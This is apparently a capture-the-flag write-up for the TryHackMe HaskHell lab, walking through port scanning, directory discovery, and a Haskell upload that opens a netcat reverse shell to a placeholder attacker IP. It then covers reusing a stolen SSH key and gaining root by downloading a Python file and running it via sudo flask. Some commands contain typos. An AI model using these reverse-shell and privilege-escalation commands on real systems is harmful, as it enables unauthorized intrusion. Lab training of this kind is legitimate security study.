# TryHackMe 🚀HaskHell👾 CTF WriteUp! #

Hello everyone, today we gonna see how to solve the [TryHackMe HaskHell CTF !](https://www.tryhackme.com/room/haskhell)

First let's do a scan on the Ip !


We will use [Ramp](https://github.com/6Sixty6/ramp) to scan this IP for open ports. We can also use nmap but Ramp is way faster than nmap (took 2 seconds with Ramp)


## We found 2 ports open !


![image](https://user-images.githubusercontent.com/88773911/155165883-8ac0e037-b508-4a33-b125-c5a5626f53fa.png)


### We can see that on the port 22 there is a ssh service running, and on the port 5001 there is a http server.

When accessing this http server we are greeted with this page.

![image](https://user-images.githubusercontent.com/88773911/155166165-8ae8fbb7-aefb-4d25-b3c8-6180310cb47c.png)

## We can also see a **homerwork** hyperlink, let's check that out!

![image](https://user-images.githubusercontent.com/88773911/155166351-36e91e77-d911-46ef-95bb-be26aa4bad3d.png)

### We can see another hyperlink which will lead to /upload/ but it will not work/

### Let's try to do a gobuster directory search to see if there are any other directories.

![image](https://user-images.githubusercontent.com/88773911/155166792-de528afb-b375-46dc-92f6-bc82159153fb.png)

## We found the directory **/submit**

![image](https://user-images.githubusercontent.com/88773911/155166870-d4c920e1-f8cf-4ce4-83d3-03fab72579a0.png)

## The professor said that the uploaded code will be ran and compiled and all the output will be piped to /uploads/. Interesting..

# FOOTHOLD

After some hassle, I managed to find an exploit which gave me a reverse shell!

code: 

```
module Main where
import System.Process

main = callCommand "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f |bash -i 2>&1 | nc YOUR_IP PORT >/tmp/f"
```

## Set a netcat listener with the command ```nc -lvnp PORT``` 

##Save it as reverse_shell.hs and upload it to the server !

## And we got it, our foothold !

![image](https://user-images.githubusercontent.com/88773911/155168564-1dd48f9d-4474-49ee-b5d0-d7842868c711.png)

## Then, Type ```python3 -c 'impoty pty;pty.spawn("/bin/bash")``` to stabilize the shell!

## After some time, we found that the user **prof** has a .ssh directory, let's check it out !

![image](https://user-images.githubusercontent.com/88773911/155168821-d89ec0ed-95e0-42fd-bd69-a8821c523be8.png)

## Let's try to copy-paste that to our machine .

## After you copied the ssh key, don't forget to do ```chmod 600 rsa_file``` to give it permission, otherwise it wont work.

## And we did it, we are in the professor's machine.

![image](https://user-images.githubusercontent.com/88773911/155169197-c1e6e71c-6baf-4dba-9518-2b8a57e052e2.png)

## Let's now find a way to get root using privilege escalation techniques.

## When running ```sudo -l ``` we can see that **/usr/bin/flask run** will run under root

## Let's find a way to exploit it 

## After some time, I found an exploit !

## First, you need to create a exploit on your local machine ``` touch exploit.py && nano exploit.py```

## In this exploit you will write the following:

```import pty;pty.spawn("/bin/bash")```

## After that, save the exploit and start a python webserver using the command ``` python3 http.server 1337```

## Go back on the ssh machine and do the following:

```
cd /tmp
wget http://yourip:1337/exploit.py 
export FLASK_APP=exploit.py
sudo /usr/bin/flask run
``` 

## And ladies and gentlemen's, we got root !

# Thanks for reading !

